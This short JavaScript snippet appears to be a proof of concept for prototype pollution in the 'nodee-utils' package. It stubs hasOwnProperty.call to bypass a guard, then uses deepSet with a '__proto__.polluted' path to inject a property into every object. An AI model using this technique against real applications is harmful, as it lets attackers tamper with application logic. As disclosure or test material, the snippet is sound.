Object.prototype.hasOwnProperty.call = () => true;
const {object} = require('nodee-utils');
var obj = {};
console.log({}.polluted);
object.deepSet({}, '__proto__.polluted', 'yes');
console.log({}.polluted);